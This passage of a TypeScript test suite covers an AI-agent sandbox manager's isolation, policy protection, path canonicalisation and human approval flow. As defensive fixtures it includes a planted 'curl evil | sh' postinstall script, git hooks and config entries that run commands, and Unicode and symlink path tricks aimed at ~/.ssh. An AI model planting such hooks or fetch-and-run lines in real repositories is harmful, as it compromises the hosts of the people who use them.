      expect(probes.some((e) => e.actor === 'agent:agent-b' && e.sandboxId === null)).toBe(true);
      const mine = await ctx.abox.queryAudit(A, { limit: 2000 });
      const ownIds = new Set(
        (
          await ctx.abox.listSandboxes(HUMAN, { owner: 'agent:agent-a', includeRemoved: true })
        ).sandboxes.map((s) => s.id),
      );
      for (const e of mine)
        expect(
          e.actor === 'agent:agent-a' || (e.sandboxId !== null && ownIds.has(e.sandboxId)),
          `${e.action} ${e.actor} ${e.sandboxId}`,
        ).toBe(true);
      const bIds = new Set(
        (
          await ctx.abox.listSandboxes(HUMAN, { owner: 'agent:agent-b', includeRemoved: true })
        ).sandboxes.map((s) => s.id),
      );
      for (const e of mine)
        expect(
          e.sandboxId !== null && bIds.has(e.sandboxId),
          `${e.action}: an entry about a sandbox of agent-b is visible to agent-a`,
        ).toBe(false);
      expect(mine.some((e) => e.action === 'sandbox.lookup')).toBe(false);
      expect(await ctx.abox.queryAudit(B, { sandboxId: a })).toEqual([]);
    });

    it('B cannot reach A by guessing the engine names either (same-named requests and ids do not collide)', async () => {
      const dup = await ctx.create(B, {
        template: 'alpine-min',
        workspace: { mode: 'empty' },
        name: 'a-box',
        requestId: 'same-key',
      });
      const dup2 = await ctx.create(A, {
        template: 'alpine-min',
        workspace: { mode: 'empty' },
        name: 'a-box-2',
        requestId: 'same-key',
      });
      expect(dup.sandbox.id).not.toBe(dup2.sandbox.id); // idempotency keys are per owner
      expect(dup2.sandbox.owner).toBe('agent:agent-a');
      await ctx.abox.removeSandbox(B, dup.sandbox.id);
      await ctx.abox.removeSandbox(A, dup2.sandbox.id);
      ctx.created.splice(ctx.created.indexOf(dup.sandbox.id), 1);
      ctx.created.splice(ctx.created.indexOf(dup2.sandbox.id), 1);
    }, 120_000);

    it('quotas are per agent context: one agent exhausting its limit does not block another', async () => {
      const T1: Caller = { contextId: 'tiny-a' };
      const T2: Caller = { contextId: 'tiny-b' };
      const first = await ctx.create(T1, { template: 'alpine-min', workspace: { mode: 'empty' } });
      const err = (await errorOf(
        ctx.abox.createSandbox(
          T1,
          { template: 'alpine-min', workspace: { mode: 'empty' } },
          { waitForApprovalMs: 0 },
        ),
      )) as AboxError;
      expect(err.code).toBe('policy_denied');
      expect(err.message).toMatch(/sandbox/);
      const other = await ctx.create(T2, { template: 'alpine-min', workspace: { mode: 'empty' } });
      expect(other.sandbox.owner).toBe('agent:tiny-b');
      await ctx.abox.removeSandbox(HUMAN, first.sandbox.id);
      await ctx.abox.removeSandbox(HUMAN, other.sandbox.id);
      ctx.created.splice(ctx.created.indexOf(first.sandbox.id), 1);
      ctx.created.splice(ctx.created.indexOf(other.sandbox.id), 1);
    }, 120_000);

    it('an unknown context id (e.g. one invented by an agent) is denied everywhere', async () => {
      const ghost: Caller = { contextId: 'agent-z' };
      for (const op of [
        () => ctx.abox.listSandboxes(ghost),
        () => ctx.abox.createSandbox(ghost, { template: 'alpine-min' }),
        () => ctx.abox.inspectSandbox(ghost, a),
        () => ctx.abox.showPolicy(ghost),
      ])
        expect(await errorOf(op())).toMatchObject({ code: 'policy_denied' });
      // and "human" cannot be claimed by a different spelling
      for (const id of ['Human', 'human ', 'HUMAN', 'agent:human', 'human/x']) {
        expect(await errorOf(ctx.abox.listSandboxes({ contextId: id })), id).toMatchObject({
          code: 'policy_denied',
        });
      }
      // `humanConfirmed` has no effect for agents: it never satisfies an approval item
      const r = await ctx.abox.createSandbox(
        { contextId: 'agent-a', humanConfirmed: true },
        {
          template: 'alpine-min',
          workspace: { mode: 'empty' },
          overrides: { network: { mode: 'allowlist', allow: ['example.org'] } },
        },
        { waitForApprovalMs: 0 },
      );
      expect(r.status).toBe('pending_approval');
    });
  });

  // =================================================================================================================
  describe('policy.yaml cannot be changed through the agent path', () => {
    it('setPolicy by an agent is denied, audited as policy_change_denied, and neither hash nor file change', async () => {
      const file = ctx.abox.paths.policyFile;
      const before = readFileSync(file, 'utf8');
      const hash = ctx.abox.policyHash;
      const wide = before
        .replace('allow: [example.com]', 'allow: ["*"]')
        .replace('approval: medium', 'approval: open');
      expect(wide).not.toBe(before);
      expect(await errorOf(ctx.abox.setPolicy(A, wide))).toMatchObject({ code: 'policy_denied' });
      expect(
        await errorOf(ctx.abox.setPolicy({ contextId: 'agent-a', humanConfirmed: true }, wide)),
      ).toMatchObject({ code: 'policy_denied' });
      expect(readFileSync(file, 'utf8')).toBe(before);
      expect(ctx.abox.policyHash).toBe(hash);
      const entries = await ctx.abox.queryAudit(HUMAN, { action: 'policy_change_denied' });
      expect(
        entries.filter((e) => e.actor === 'agent:agent-a' && e.decision === 'deny').length,
      ).toBeGreaterThanOrEqual(2);
      expect(
        (await ctx.abox.queryAudit(A, { action: 'policy_change_denied' })).length,
      ).toBeGreaterThanOrEqual(2);
    });

    it('an agent sees only its own resolved rights, not other contexts or the policy file path of others', async () => {
      const v = await ctx.abox.showPolicy(A);
      expect(v).toMatchObject({ contextId: 'agent-a', kind: 'agent', owner: 'agent:agent-a' });
      expect(v.profiles).toBeUndefined();
      expect(v.contexts).toBeUndefined();
      const h = await ctx.abox.showPolicy(HUMAN);
      expect(Object.keys(h.contexts ?? {})).toEqual(expect.arrayContaining(['agent-a', 'agent-b']));
    });

    it('operator functions are human only: policy, approvals, reconcile, gc, doctor, tokens, audit export', async () => {
      const sink = { write: () => true };
      const ops: Array<[string, () => Promise<unknown>]> = [
        ['doctor', () => ctx.abox.doctor(A)],
        ['reconcile', () => ctx.abox.reconcile(A, { apply: true, removeOrphans: true })],
        ['gc', () => ctx.abox.gc(A, {})],
        ['sweepTtl', () => ctx.abox.sweepTtl(A)],
        ['gcImages', () => ctx.abox.gcImages(A)],
        ['verifyAudit', () => ctx.abox.verifyAudit(A)],
        ['exportAudit', () => ctx.abox.exportAudit(A, {}, sink)],
        ['createAgentToken', () => ctx.abox.createAgentToken(A, 'agent-a', 'mine')],
        ['listAgentTokens', () => ctx.abox.listAgentTokens(A)],
        ['approve', () => ctx.abox.approve(A, 'whatever')],
        ['deny', () => ctx.abox.deny(A, 'whatever')],
        ['expireApprovals', () => ctx.abox.expireApprovals(A)],
        ['applyApprovedAccess', () => ctx.abox.applyApprovedAccess(A, 'whatever')],
      ];
      for (const [name, op] of ops) {
        const e = (await errorOf(op())) as AboxError | undefined;
        expect(e?.code, name).toBe('policy_denied');
      }
    });

    it('the config and data directories cannot become a workspace or a mount (they hold policy.yaml, state.db, other sandboxes)', async () => {
      const p = ctx.abox.paths;
      const before = await containerCount(ctx);
      const victims = [
        p.configDir,
        p.policyFile,
        p.dataDir,
        p.stateDb,
        p.cacheDir,
        p.runtimeDir,
        p.logsDir,
        p.templatesDir,
        join(p.dataDir, 'sandboxes'),
        join(p.configDir, '..'),
      ];
      for (const v of victims) {
        for (const caller of [A, HUMAN_YES]) {
          for (const req of [
            { template: 'alpine-min', workspace: { mode: 'copy' as const, path: v } },
            { template: 'alpine-min', workspace: { mode: 'mount' as const, path: v } },
            {
              template: 'alpine-min',
              workspace: { mode: 'empty' as const },
              overrides: { mounts: [{ source: v, target: '/mnt/cfg' }] },
            },
          ]) {
            const r = await attempt(ctx, caller, req);
            expect(r, `${caller.contextId} ${v} ${JSON.stringify(req.workspace)}`).toMatchObject({
              kind: 'error',
            });
            expect(REFUSED).toContain(r.code);
          }
        }
      }
      expect(await containerCount(ctx)).toBe(before);
    }, 120_000);

    it("another sandbox's staging directory cannot be mounted either", async () => {
      const staged = (
        await ctx.create(A, { template: 'alpine-min', workspace: { mode: 'copy', path: env.app } })
      ).sandbox.id;
      const dir = join(ctx.abox.paths.dataDir, 'sandboxes', staged.split('/')[1]!);
      expect(existsSync(dir)).toBe(true);
      for (const caller of [A, HUMAN_YES]) {
        const r = await attempt(ctx, caller, {
          template: 'alpine-min',
          workspace: { mode: 'mount', path: join(dir, 'staging') },
        });
        expect(r, caller.contextId).toMatchObject({ kind: 'error' });
        expect(REFUSED).toContain(r.code);
      }
      await ctx.abox.removeSandbox(A, staged);
      ctx.created.splice(ctx.created.indexOf(staged), 1);
    }, 120_000);

    it('the policy file mode is 0600; doctor warns when it becomes group/other-writable', async () => {
      expect(lstatSync(ctx.abox.paths.policyFile).mode & 0o777).toBe(0o600);
      const doc = await ctx.abox.doctor(HUMAN);
      expect(doc.policy.fileMode).toBe('600');
      chmodSync(ctx.abox.paths.policyFile, 0o666);
      try {
        const bad = await ctx.abox.doctor(HUMAN);
        expect(
          bad.checks.some((c) => /policy/i.test(`${c.id} ${c.title}`) && c.level !== 'ok'),
        ).toBe(true);
      } finally {
        chmodSync(ctx.abox.paths.policyFile, 0o600);
      }
    });

    it('abox state is private: data dir, state.db and exec logs are not readable by other users', async () => {
      const id = (await ctx.create(A, { template: 'alpine-min', workspace: { mode: 'empty' } }))
        .sandbox.id;
      const r = await sh(ctx, A, id, 'echo log-me');
      const pr = ctx.abox.paths;
      for (const p of [pr.dataDir, pr.configDir, pr.stateDb, pr.logsDir]) {
        expect(lstatSync(p).mode & 0o077, `${p} is accessible to group/other`).toBe(0);
      }
      const logFile = join(
        pr.logsDir,
        id.split('/')[1]!,
        readdirSync(join(pr.logsDir, id.split('/')[1]!))[0]!,
      );
      expect(readFileSync(logFile, 'utf8')).toContain('log-me');
      expect(lstatSync(logFile).mode & 0o077, 'exec log is accessible to group/other').toBe(0);
      expect(r.logRef).toContain(id.split('/')[1]!);
      await ctx.abox.removeSandbox(A, id);
      ctx.created.splice(ctx.created.indexOf(id), 1);
    }, 120_000);
  });

  // =================================================================================================================
  describe('path canonicalisation of workspace and mount requests', () => {
    const forbiddenWorkspaces = (): Array<[string, string]> => {
      const { home, projects, app, datasets } = env;
      return [
        ['plain ~/.ssh', join(home, '.ssh')],
        ['tilde ~/.ssh', '~/.ssh'],
        ['tilde ~', '~'],
        ['.. out of the workspace root', join(app, '..', '..', '.ssh')],
        ['.. at the root', join(projects, '..', '.ssh')],
        ['relative path out of the project dir', '../../.ssh'],
        ['double slash', `${home}//.ssh`],
        ['dot segments', `${home}/./.ssh/`],
        ['trailing dot', `${home}/.ssh/.`],
        ['detour', `${home}/.ssh/../.ssh`],
        ['below a forbidden dir', join(home, '.ssh', 'sub')],
        ['symlink to ~/.ssh inside the root', join(projects, 'evil-link')],
        ['symlink chain to ~/.ssh', join(projects, 'chain1')],
        [
          'link/.. follows the PHYSICAL parent (=~/.ssh), not the lexical one (=projects)',
          `${join(projects, 'lnk')}/..`,
        ],
        ['symlinked dataset', join(datasets, 'lnk-ssh')],
        ['symlink to the abox config dir', join(projects, 'to-config')],
        ['home itself (contains ~/.ssh)', home],
        ['parent of the root (contains it)', join(projects, '..')],
        ['filesystem root', '/'],
        ['/home', '/home'],
        ['/etc', '/etc'],
        ['/proc/self/root', '/proc/self/root'],
        ['/proc', '/proc'],
        ['/sys', '/sys'],
        ['/dev', '/dev'],
        ['/root', '/root'],
        ['/run', '/run'],
        ['/var/run', '/var/run'],
        ['/var/lib/docker', '/var/lib/docker'],
        ['/boot', '/boot'],
      ];
    };

    it('agent: every trick is refused (policy_denied/invalid_input), nothing is created, every refusal is audited', async () => {
      const before = await containerCount(ctx);
      const auditBefore = (
        await ctx.abox.queryAudit(HUMAN, {
          action: 'sandbox.create',
          decision: 'deny',
          limit: 5000,
        })
      ).length;
      let denials = 0;
      for (const [label, path] of forbiddenWorkspaces()) {
        for (const mode of ['copy', 'mount'] as const) {
          const r = await attempt(ctx, A, { template: 'alpine-min', workspace: { mode, path } });
          expect(r, `workspace ${label} (${mode})`).toMatchObject({ kind: 'error' });
          expect(REFUSED, `${label}: ${r.code} ${r.message}`).toContain(r.code);
          if (r.code === 'policy_denied') denials++;
        }
        const m = await attempt(ctx, A, {
          template: 'alpine-min',
          workspace: { mode: 'empty' },
          overrides: { mounts: [{ source: path, target: '/mnt/x' }] },
        });
        expect(m, `mount ${label}`).toMatchObject({ kind: 'error' });
        expect(REFUSED, `mount ${label}: ${m.code} ${m.message}`).toContain(m.code);
        if (m.code === 'policy_denied') denials++;
      }
      expect(await containerCount(ctx)).toBe(before);
      const auditAfter = (
        await ctx.abox.queryAudit(HUMAN, {
          action: 'sandbox.create',
          decision: 'deny',
          limit: 5000,
        })
      ).length;
      expect(auditAfter - auditBefore, 'policy denials audited').toBeGreaterThanOrEqual(
        denials - 5,
      );
    }, 240_000);

    it('human (no root restriction, confirmation given): the forbidden list still applies to every spelling', async () => {
      const { home, datasets } = env;
      const variants: Array<[string, string]> = [
        ['~/.ssh', '~/.ssh'],
        [
          '~/.SSH (case folding; the directory exists as a different entry on this filesystem)',
          join(home, '.SSH'),
        ],
        ['~/.Ssh', join(home, '.Ssh')],
        ['fullwidth full stop U+FF0E (NFKC folds it to ".")', join(home, '．ssh')],
        ['fullwidth letters (NFKC folds them to "ssh")', join(home, '.ｓｓｈ')],
        ['zero-width space inside the name', `${home}/.s\u200bsh`],
        ['zero-width joiner', `${home}/.ssh‍`],
        ['right-to-left override', `${home}/.‮ssh`],
        ['NUL byte', `${home}/.ssh\u0000`],
        ['newline', `${home}/.ssh\n`],
        ['control char', `${home}/.ssh\u0007`],
        ['symlinked dataset', join(datasets, 'lnk-ssh')],
        ['link/..', `${join(env.projects, 'lnk')}/..`],
      ];
      for (const [label, path] of variants) {
        for (const kind of ['workspace', 'mount'] as const) {
          const req =
            kind === 'workspace'
              ? { template: 'alpine-min', workspace: { mode: 'copy' as const, path } }
              : {
                  template: 'alpine-min',
                  workspace: { mode: 'empty' as const },
                  overrides: { mounts: [{ source: path, target: '/mnt/x' }] },
                };
          const r = await attempt(ctx, HUMAN_YES, req);
          expect(r, `${kind} ${label}`).toMatchObject({ kind: 'error' });
          expect(REFUSED, `${kind} ${label}: ${r.code} ${r.message}`).toContain(r.code);
        }
      }
    }, 240_000);

    it('mount targets that would shadow system locations or are not normalised are refused', async () => {
      for (const target of [
        '/',
        '/proc',
        '/proc/x',
        '/sys',
        '/dev',
        '/dev/shm',
        '/etc',
        '/etc/ssl',
        '/run',
        '/var/run',
        '/var/run/docker.sock',
        '/boot',
        'relative/path',
        '/mnt/../etc',
        '/mnt//x',
        '/mnt/./x',
        '/mnt/x​',
        '/mnt/‮x',
      ]) {
        const r = await attempt(ctx, A, {
          template: 'alpine-min',
          workspace: { mode: 'empty' },
          overrides: { mounts: [{ source: env.datasets, target }] },
        });
        expect(r, `target ${JSON.stringify(target)}`).toMatchObject({ kind: 'error' });
        expect(REFUSED).toContain(r.code);
      }
      // two mounts on one target
      const dup = await attempt(ctx, A, {
        template: 'alpine-min',
        workspace: { mode: 'empty' },
        overrides: {
          mounts: [
            { source: env.datasets, target: '/data' },
            { source: env.datasets, target: '/data' },
          ],
        },
      });
      expect(dup).toMatchObject({ kind: 'error' });
    });

    it('a legitimate dataset mount works, is read-only, and cannot be turned read-write by the agent', async () => {
      const rw = await attempt(ctx, A, {
        template: 'alpine-min',
        workspace: { mode: 'empty' },
        overrides: { mounts: [{ source: env.datasets, target: '/data', access: 'rw' }] },
      });
      expect(rw).toMatchObject({ kind: 'error', code: 'policy_denied' });
      // ro mount in medium mode needs an approval ("additional mounts need approval")
      const req = {
        template: 'alpine-min',
        workspace: { mode: 'empty' as const },
        overrides: { mounts: [{ source: env.datasets, target: '/data' }] },
      };
      const c = await createApproved(ctx, A, req);
      const r = await sh(
        ctx,
        A,
        c.sandbox.id,
        'cat /data/data.csv; echo x > /data/new.csv 2>&1; echo write=$?',
      );
      expect(r.stdout).toContain('x,y');
      expect(r.stdout).not.toContain('write=0');
      expect(existsSync(join(env.datasets, 'new.csv'))).toBe(false);
      await ctx.abox.removeSandbox(A, c.sandbox.id);
      ctx.created.splice(ctx.created.indexOf(c.sandbox.id), 1);
    }, 120_000);

    it('workspace paths with NUL/control characters are rejected as input errors, not passed on', async () => {
      for (const path of [`${env.app}\u0000/x`, `${env.app}\n`]) {
        const r = await attempt(ctx, A, {
          template: 'alpine-min',
          workspace: { mode: 'copy', path },
        });
        expect(r.kind).toBe('error');
        expect(REFUSED).toContain(r.code);
      }
    });
  });

  // =================================================================================================================
  describe('hostile repositories: code from a project or a sandbox never runs on the host', () => {
    const modes = ['clone', 'worktree', 'mount', 'copy'] as const;
    // Documented behaviour (core/src/workspace/prepare.ts): `worktree` checks out with the filter drivers configured in the
    // USER'S OWN repository config (git-lfs needs that). Those are the only host commands allowed to run.
    const ACCEPTED = new Set(['filter-clean', 'filter-smudge', 'filter-process']);
    const markersNow = (): string[] =>
      readdirSync(env.root)
        .filter((f) => f.startsWith(`${basename(fx.evilMarker)}.`))
        .map((f) => f.slice(basename(fx.evilMarker).length + 1));
    const clearMarkers = (): void => {
      for (const m of markersNow()) rmSync(`${fx.evilMarker}.${m}`, { force: true });
    };
    for (const mode of modes) {
      it(`create + export from a repository whose .git config/hooks/attributes execute commands (workspace mode ${mode})`, async () => {
        clearMarkers();
        const dir = join(env.projects, `evil-${mode}`);
        execFileSync('cp', ['-a', fx.evilrepo, dir]);
        const r = await attempt(ctx, A, { template: 'alpine-min', workspace: { mode, path: dir } });
        if (r.kind === 'error') {
          // refusing a hostile-looking repo is acceptable; running it is not
          expect(REFUSED).toContain(r.code);
        } else {
          const id = ctx.created.at(-1)!;
          await sh(ctx, A, id, 'echo changed > /workspace/a.txt; echo more > /workspace/b.txt');
          for (const format of ['diff', 'patch', 'files', 'branch'] as const) {
            const e = (await errorOf(
              ctx.abox.exportSandbox(A, id, {
                format,
                ...(format === 'branch' ? { branchName: `abox/e2e-${mode}` } : {}),
              }),
            )) as AboxError | undefined;
            if (e)
              expect([
                'policy_denied',
                'invalid_input',
                'conflict',
                'unsupported',
                'backend_error',
              ]).toContain(e.code);
          }
          await ctx.abox.removeSandbox(A, id);
          ctx.created.splice(ctx.created.indexOf(id), 1);
        }
        const ran = markersNow();
        const unexpected = ran.filter((m) => !ACCEPTED.has(m));
        expect(
          unexpected,
          `host commands from the repository's .git ran in workspace mode ${mode}: ${ran.join(', ')}`,
        ).toEqual([]);
        // mount and worktree use the user's repository directly (documented for worktree; observed for mount as well: README)
        if (mode === 'clone' || mode === 'copy')
          expect(ran, `nothing from the repository's config may run for ${mode}`).toEqual([]);
        clearMarkers();
      }, 180_000);
    }

    it('a sandbox cannot make export run host commands: planted .git/config, hooks and attributes in the copied tree', async () => {
      const dir = join(env.projects, 'plant-git');
      mkdirSync(dir, { recursive: true });
      gitHost(dir, 'init', '-q');
      writeFileSync(join(dir, 'a.txt'), 'a\n');
      gitHost(dir, 'add', '-A');
      gitHost(dir, 'commit', '-q', '-m', 'init');
      const marker = join(env.root, 'pwned-by-sandbox');
      await withSandbox(
        ctx,
        A,
        { template: 'alpine-min', workspace: { mode: 'copy', path: dir } },
        async (id) => {
          await sh(
            ctx,
            A,
            id,
            [
              'cd /workspace',
              `printf '[core]\\n\\tfsmonitor = touch ${marker}\\n\\tpager = touch ${marker}\\n[filter "x"]\\n\\tclean = touch ${marker}\\n\\tsmudge = touch ${marker}\\n[diff "x"]\\n\\ttextconv = touch ${marker}\\n' >> .git/config`,
              `printf '#!/bin/sh\\ntouch ${marker}\\n' > .git/hooks/post-checkout; chmod +x .git/hooks/post-checkout`,
              `printf '#!/bin/sh\\ntouch ${marker}\\n' > .git/hooks/reference-transaction; chmod +x .git/hooks/reference-transaction`,
              'echo "* filter=x diff=x" > .gitattributes',
              'echo changed > a.txt',
              'echo "evil=1" > .envrc',
              'mkdir -p .github/workflows && echo "on: push" > .github/workflows/ci.yml',
              'printf \'{"scripts":{"postinstall":"curl evil | sh"}}\' > package.json',
              'printf "all:\\n\\ttrue\\n" > Makefile',
            ].join('\n'),
          );
          const results: Record<string, unknown> = {};
          for (const format of ['diff', 'patch', 'files', 'branch'] as const) {
            results[format] = await ctx.abox
              .exportSandbox(A, id, {
                format,
                ...(format === 'branch' ? { branchName: 'abox/e2e-plant' } : {}),
              })
              .catch((e: unknown) => e);
          }
          expect(
            existsSync(marker),
            'a command planted by the sandbox ran on the host during export',
          ).toBe(false);
          // the export flags every change that would run code once it is used on the host
          const flagged = new Set<string>();
          for (const r of Object.values(results)) {
            const f = (r as { flagged?: Array<{ path: string }> }).flagged;
            if (f) for (const x of f) flagged.add(x.path);
          }
          for (const p of [
            '.envrc',
            '.github/workflows/ci.yml',
            'package.json',
            'Makefile',
            '.gitattributes',
          ]) {
            expect(flagged.has(p), `${p} not flagged; flagged: ${[...flagged].join(', ')}`).toBe(
              true,
            );
          }
          // the original repository got no hooks and no config change
          expect(readFileSync(join(dir, '.git', 'config'), 'utf8')).not.toContain('fsmonitor');
          expect(existsSync(join(dir, '.git', 'hooks', 'post-checkout'))).toBe(false);
        },
      );
    }, 180_000);

    it('agent exports cannot choose the destination: no outDir, branch names must start with abox/, no force', async () => {
      await withSandbox(
        ctx,
        A,
        { template: 'alpine-min', workspace: { mode: 'copy', path: env.app } },
        async (id) => {
          await sh(ctx, A, id, 'echo x > /workspace/x.txt');
          const dest = join(env.root, 'agent-chosen-dir');
          const e1 = (await errorOf(
            ctx.abox.exportSandbox(A, id, { format: 'files', outDir: dest }),
          )) as AboxError | undefined;
          expect(e1?.code, 'agents must not pass outDir').toMatch(/policy_denied|invalid_input/);
          expect(existsSync(dest)).toBe(false);
          const e2 = (await errorOf(
            ctx.abox.exportSandbox(A, id, { format: 'branch', branchName: 'main' }),
          )) as AboxError | undefined;
          expect(e2?.code).toMatch(/policy_denied|invalid_input/);
          const e3 = (await errorOf(
            ctx.abox.exportSandbox(A, id, {
              format: 'branch',
              branchName: 'abox/e2e-x',
              force: true,
            }),
          )) as AboxError | undefined;
          expect(e3?.code).toMatch(/policy_denied|invalid_input/);
        },
      );
    }, 120_000);
  });

  // =================================================================================================================
  describe('approvals (CLI-free flow through the manager)', () => {
    let w: Env;
    let c: Ctx;
    const widen = {
      template: 'alpine-min',
      workspace: { mode: 'empty' as const },
      overrides: { network: { mode: 'allowlist' as const, allow: ['example.org'] } },
    };

    beforeAll(async () => {
      w = makeEnv();
      c = await openAbox(w, { fakeClock: true });
      await c.abox.buildTemplate(HUMAN, 'alpine-min');
    }, 180_000);
    afterAll(async () => {
      await c?.close();
      w?.cleanup();
    });

    it('create beyond the profile queues an approval; repeating the call reuses it; approve -> the repeat creates; one-time use', async () => {
      const p1 = await c.abox.createSandbox(A, widen, { waitForApprovalMs: 0 });
      expect(p1.status).toBe('pending_approval');
      if (p1.status !== 'pending_approval') return;
      expect(p1.risks.length).toBeGreaterThan(0);
      const p2 = await c.abox.createSandbox(A, widen, { waitForApprovalMs: 0 });
      expect(p2.status === 'pending_approval' && p2.approvalId).toBe(p1.approvalId); // no duplicates
      expect(await c.abox.listApprovals(A, { status: 'pending' })).toHaveLength(1);
      expect(await c.abox.listApprovals(B, { status: 'pending' })).toHaveLength(0);
      // the agent's own reason text is stored as untrusted, risks are abox's
      const view = await c.abox.getApproval(A, p1.approvalId);
      expect(view).toMatchObject({ status: 'pending', requester: 'agent:agent-a', kind: 'create' });
      // an agent cannot approve (itself or as someone else) and the attempt is audited
      for (const who of [A, B])
        expect(await errorOf(c.abox.approve(who, p1.approvalId))).toMatchObject({
          code: 'policy_denied',
        });
      expect((await c.abox.getApproval(HUMAN, p1.approvalId)).status).toBe('pending');
      expect(
        (await c.abox.queryAudit(HUMAN, { action: 'approval.approve_denied' })).length,
      ).toBeGreaterThanOrEqual(2);
      // the human decides
      const dec = await c.abox.approve(HUMAN, p1.approvalId, 'ok');
      expect(dec.approval).toMatchObject({ status: 'approved', decidedBy: 'human' });
      const done = await c.abox.createSandbox(A, widen, { waitForApprovalMs: 0 });
      expect(done.status).toBe('created');
      if (done.status !== 'created') return;
      c.created.push(done.sandbox.id);
      expect((await c.abox.getApproval(HUMAN, p1.approvalId)).usedAt).not.toBeNull();
      // used up: the same request needs a new decision
      const again = await c.abox.createSandbox(A, widen, { waitForApprovalMs: 0 });
      expect(again.status).toBe('pending_approval');
      if (again.status === 'pending_approval') expect(again.approvalId).not.toBe(p1.approvalId);
    }, 120_000);

    it('a concurrent second call cannot reuse the same approval', async () => {
      const req = {
        ...widen,
        overrides: { network: { mode: 'allowlist' as const, allow: ['example.net'] } },
      };
      const p = await c.abox.createSandbox(A, req, { waitForApprovalMs: 0 });
      if (p.status !== 'pending_approval') throw new Error(p.status);
      await c.abox.approve(HUMAN, p.approvalId);
      const results = await Promise.allSettled([
        c.abox.createSandbox(A, req, { waitForApprovalMs: 0 }),
        c.abox.createSandbox(A, req, { waitForApprovalMs: 0 }),
      ]);
      const ok = results.filter((r) => r.status === 'fulfilled' && r.value.status === 'created');
      for (const r of results)
        if (r.status === 'fulfilled' && r.value.status === 'created')
          c.created.push(r.value.sandbox.id);
      expect(
        ok.length,
        JSON.stringify(
          results.map((r) =>
            r.status === 'fulfilled' ? r.value.status : String((r as PromiseRejectedResult).reason),
          ),
        ),
      ).toBe(1);
    }, 120_000);

    it('deny: the identical request is refused at once (approval_denied); a changed request is a new question', async () => {
      const req = {
        ...widen,
        overrides: { network: { mode: 'allowlist' as const, allow: ['denied.example.org'] } },
      };
      const p = await c.abox.createSandbox(A, req, { waitForApprovalMs: 0 });
      if (p.status !== 'pending_approval') throw new Error(p.status);
      const d = await c.abox.deny(HUMAN, p.approvalId, 'no way');
      expect(d.approval.status).toBe('denied');
      expect(await errorOf(c.abox.createSandbox(A, req, { waitForApprovalMs: 0 }))).toMatchObject({
        code: 'approval_denied',
      });
      const changed = await c.abox.createSandbox(
        A,
        { ...req, overrides: { network: { mode: 'allowlist', allow: ['denied2.example.org'] } } },
        { waitForApprovalMs: 0 },
      );
      expect(changed.status).toBe('pending_approval');
    });

    it('expiry: an undecided request counts as denied (approval_expired); an approved but unused approval also lapses', async () => {
      const req = {
        ...widen,
        overrides: { network: { mode: 'allowlist' as const, allow: ['expire.example.org'] } },
      };
      const p = await c.abox.createSandbox(A, req, { waitForApprovalMs: 0 });
      if (p.status !== 'pending_approval') throw new Error(p.status);
      w.clock.offset += c.abox.config.limits.approvalTtlMs + 1000;
      await c.abox.expireApprovals(HUMAN); // (overdue entries are also flipped lazily by any read; the status is what counts)
      expect((await c.abox.getApproval(HUMAN, p.approvalId)).status).toBe('expired');
      expect(await errorOf(c.abox.createSandbox(A, req, { waitForApprovalMs: 0 }))).toMatchObject({
        code: 'approval_expired',
      });
      // approve a fresh one, let it lapse without using it
      w.clock.offset += 5 * 60_000; // leave the "expired recently" window
      const req2 = {
        ...widen,
        overrides: { network: { mode: 'allowlist' as const, allow: ['lapse.example.org'] } },
      };
      const q = await c.abox.createSandbox(A, req2, { waitForApprovalMs: 0 });
      if (q.status !== 'pending_approval') throw new Error(q.status);
      await c.abox.approve(HUMAN, q.approvalId);
      w.clock.offset += c.abox.config.limits.approvalTtlMs + 1000;
      const later = await c.abox.createSandbox(A, req2, { waitForApprovalMs: 0 });
      expect(later.status, 'a stale approval must not be honoured').toBe('pending_approval');
      if (later.status === 'pending_approval') expect(later.approvalId).not.toBe(q.approvalId);
    }, 120_000);

    it('the agent can wait for the decision: a human approving while the call blocks lets it through', async () => {
      const req = {
        ...widen,
        overrides: { network: { mode: 'allowlist' as const, allow: ['wait.example.org'] } },
      };
      const humanSide = (async () => {
        for (let i = 0; i < 100; i++) {
          const pending = await c.abox.listApprovals(HUMAN, { status: 'pending' });
          const mine = pending.find((a) => JSON.stringify(a.request).includes('wait.example.org'));
          if (mine) return c.abox.approve(HUMAN, mine.id, 'while waiting');
          await sleep(100);
        }
        throw new Error('no pending approval appeared');
      })();
      const [r] = await Promise.all([
        c.abox.createSandbox(A, req, { waitForApprovalMs: 20_000 }),
        humanSide,
      ]);
      expect(r.status).toBe('created');
      if (r.status === 'created') c.created.push(r.sandbox.id);
    }, 120_000);

    it('an approval is bound to the exact request AND to the policy content: any change asks again', async () => {
      const req = {
        ...widen,
        overrides: { network: { mode: 'allowlist' as const, allow: ['bound.example.org'] } },
      };
      const p = await c.abox.createSandbox(A, req, { waitForApprovalMs: 0 });
      if (p.status !== 'pending_approval') throw new Error(p.status);
      await c.abox.approve(HUMAN, p.approvalId);
      // different request: different question
      const other = await c.abox.createSandbox(
        A,
        {
          ...req,
          overrides: {
            network: { mode: 'allowlist', allow: ['bound.example.org', 'extra.example.org'] },
          },
        },
        { waitForApprovalMs: 0 },
      );
      expect(other.status).toBe('pending_approval');
      // the policy changes (human, comment only): the old approval no longer matches
      const text = readFileSync(c.abox.paths.policyFile, 'utf8');
      await c.abox.setPolicy(HUMAN, `${text}\n# edited by the human at ${Date.now()}\n`);
      const after = await c.abox.createSandbox(A, req, { waitForApprovalMs: 0 });
      expect(after.status, 'approval survived a policy change').toBe('pending_approval');
    }, 120_000);

    it('strict contexts need approval for each exec, bound to the exact command line', async () => {
      const S: Caller = { contextId: 'strict-agent' };
      // strict: even creation asks
      const created = await createApproved(c, S, {
        template: 'alpine-min',
        workspace: { mode: 'empty' },
      });
      const id = created.sandbox.id;
      const p = await c.abox.exec(S, id, { command: 'echo one' }, { waitForApprovalMs: 0 });
      expect(p.status).toBe('pending_approval');
      if (p.status !== 'pending_approval') return;
      await c.abox.approve(HUMAN, p.approvalId);
      const done = await c.abox.exec(S, id, { command: 'echo one' }, { waitForApprovalMs: 0 });
      expect(done).toMatchObject({ status: 'completed', stdout: 'one\n' });
      const different = await c.abox.exec(S, id, { command: 'echo two' }, { waitForApprovalMs: 0 });
      expect(different.status).toBe('pending_approval');
      const reuse = await c.abox.exec(S, id, { command: 'echo one' }, { waitForApprovalMs: 0 });
      expect(reuse.status, 'one-time approval was used twice').toBe('pending_approval');
    }, 120_000);
  });

  // =================================================================================================================
  describe('project template trust by content hash', () => {
    const tpl = (): string => join(fx.trustapp, '.sandbox', 'e2e-proj.yaml');
